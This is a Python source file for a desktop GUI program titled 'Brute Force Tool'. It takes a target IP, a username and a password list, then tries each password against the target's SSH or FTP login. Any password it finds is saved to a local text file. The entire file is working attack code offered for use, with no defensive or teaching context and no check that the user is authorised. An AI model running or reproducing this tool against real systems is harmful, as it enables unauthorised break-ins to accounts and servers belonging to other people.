import tkinter as tk
import customtkinter as ctk
from paramiko import SSHClient, AutoAddPolicy
from ftplib import FTP
import sys
import os
import subprocess

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

def install_dependencies():
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'paramiko'])
    except Exception as e:
        print(f"Failed to install dependencies: {str(e)}")
        sys.exit(1)

def brute_force_ssh(ip, username, password_list):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(ip, username=username, password=password)
            return password
        except:
            continue
    return None

def brute_force_ftp(ip, username, password_list):
    for password in password_list:
        try:
            ftp = FTP(ip)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return password
        except:
            continue
    return None

def start_brute_force():
    ip = entry_ip.get()
    username = entry_username.get()
    passwords = text_passwords.get("1.0", tk.END).split()

    if option.get() == "SSH":
        result = brute_force_ssh(ip, username, passwords)
    else:
        result = brute_force_ftp(ip, username, passwords)

    if result:
        result_label.configure(text=f"Success! Password: {result}")
        save_results(ip, username, result, option.get())
    else:
        result_label.configure(text="Failed to find the password.")
        save_results(ip, username, None, option.get())

def save_results(ip, username, result, protocol):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    filename = os.path.join(script_dir, "bruteforcessh_results.txt")
    with open(filename, "w") as file:
        if result:
            file.write(f"Success! IP: {ip}, Username: {username}, Password: {result}, Protocol: {protocol}\n")
        else:
            file.write("Failed to find the password.\n")

app = ctk.CTk()
app.geometry("500x500")
app.title("Brute Force Tool")

frame = ctk.CTkFrame(master=app)
frame.pack(pady=20, padx=20, fill="both", expand=True)

label_ip = ctk.CTkLabel(master=frame, text="Target IP:")
label_ip.pack(pady=5)
entry_ip = ctk.CTkEntry(master=frame)
entry_ip.pack(pady=5)

label_username = ctk.CTkLabel(master=frame, text="Username:")
label_username.pack(pady=5)
entry_username = ctk.CTkEntry(master=frame)
entry_username.pack(pady=5)

label_passwords = ctk.CTkLabel(master=frame, text="Password List:")
label_passwords.pack(pady=5)
text_passwords = ctk.CTkTextbox(master=frame, height=100)
text_passwords.pack(pady=5)

option = ctk.CTkOptionMenu(master=frame, values=["SSH", "FTP"])
option.pack(pady=5)

button_start = ctk.CTkButton(master=frame, text="Start Brute Force", command=start_brute_force)
button_start.pack(pady=20)

result_label = ctk.CTkLabel(master=frame, text="")
result_label.pack(pady=5)

if __name__ == "__main__":
    install_dependencies()
    app.mainloop()